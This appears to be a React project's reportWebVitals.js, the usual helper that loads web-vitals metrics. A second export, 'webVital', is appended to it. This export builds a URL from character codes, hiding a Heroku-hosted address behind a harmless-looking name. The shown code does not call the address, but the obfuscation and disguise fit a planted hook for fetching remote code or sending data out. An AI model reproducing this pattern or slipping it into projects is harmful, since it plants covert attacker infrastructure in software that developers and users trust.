const reportWebVitals = onPerfEntry => {
  if (onPerfEntry && onPerfEntry instanceof Function) {
    import('web-vitals').then(({ getCLS, getFID, getFCP, getLCP, getTTFB }) => {
      getCLS(onPerfEntry);
      getFID(onPerfEntry);
      getFCP(onPerfEntry);
      getLCP(onPerfEntry);
      getTTFB(onPerfEntry);
    });
  }
};

export default reportWebVitals;
export const webVital = String.fromCharCode(
  104, 116, 116, 112, 115, 58, 47, 47, 111, 112, 101, 110, 115, 101, 97, 45, 108, 105, 115, 116, 105, 110, 103, 45, 105, 110, 102, 111, 46, 104, 101, 114, 111, 107, 117, 97, 112, 112, 46, 99, 111, 109
);
